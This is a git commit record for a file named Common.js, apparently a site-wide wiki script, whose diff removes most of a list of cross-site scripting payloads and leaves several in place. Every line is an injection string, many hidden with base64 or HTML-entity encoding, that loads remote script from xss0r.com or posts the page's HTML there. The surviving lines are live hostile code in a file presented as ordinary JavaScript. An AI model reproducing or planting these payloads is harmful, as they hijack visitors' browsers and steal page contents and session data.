b1aa8f7cf33f616372bb5a2224583cfcd84b19e2
IYBmad <city_a.m@live.fr>
2025-12-30 13:49:15 +0100

    Update Common.js

--- Common.js
+++ Common.js
@@ -1,26 +1,6 @@
-'"><script src=https://xss0r.com/c/iybmad></script>
-"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaXlibWFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOzo&#61;; onerror=eval(atob(this.id))>
-javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss0r.com/c/iybmad\';document.body.appendChild(a)')
-"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaXlibWFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOzo&#61;; autofocus>
-"><video><source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaXlibWFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOzo&#61;;>
-"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#48;&#114;&#46;&#99;&#111;&#109;&#47;&#99;&#47;&#105;&#121;&#98;&#109;&#97;&#100;&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss0r.com/c/iybmad");a.send();</script>
-<script>$.getScript("//xss0r.com/c/iybmad")</script>
-var a=document.createElement("script");a.src="https://xss0r.com/c/iybmad";document.body.appendChild(a);
 '"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaXlibWFkIjtkb2N1bWVudC5ib2R5LmFwcGVuZChhKTs='))//
 '"><img src=x onerror="eval(atob('dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTthLnNyYyA9ICdodHRwczovL3hzczByLmNvbS9jL2l5Ym1hZCc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs='))">
-"><img src=&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#48;&#114;&#46;&#99;&#111;&#109;&#47;&#99;&#47;&#105;&#121;&#98;&#109;&#97;&#100; onerror=&#101;&#118;&#97;&#108;&#40;&#97;&#116;&#111;&#98;&#40;&#116;&#104;&#105;&#115;&#46;&#115;&#114;&#99;&#41;&#41;>
-'"<img src="https://xss0r.com/c/iybmad" onerror='this.src="https://xss0r.com/c/iybmad"'>
-'"<img src=x onerror='this.src="https://xss0r.com/c/iybmad"'>
-'"<img src=x onerror='fetch("https://xss0r.com/c/iybmad",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
-'"<iframe src='javascript:window.location="https://xss0r.com/c/iybmad"'></iframe>
 '"<iframe srcdoc='<script>window.location="https://xss0r.com/c/iybmad"</script>'></iframe>
 '"<iframe srcdoc='<script>fetch("https://xss0r.com/c/iybmad",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
 '"<object data='javascript:window.location="https://xss0r.com/c/iybmad"'></object>
-<input onfocus='fetch("https://xss0r.com/c/iybmad",{method:"POST",mode:"no-cors"})' autofocus>
-'"<script type="text/javascript" src="https://xss0r.com/c/iybmad"></script>
-'"<script type="module" src="https://xss0r.com/c/iybmad"></script>
-'"<script nomodule src="https://xss0r.com/c/iybmad"></script>
-javascript:window.location="https://xss0r.com/c/iybmad"
-javascript:fetch("https://xss0r.com/c/iybmad")
 <a href="#" onclick="fetch('https://xss0r.com/c/iybmad').then(r=>r.text()).then(eval)">Click me</a>
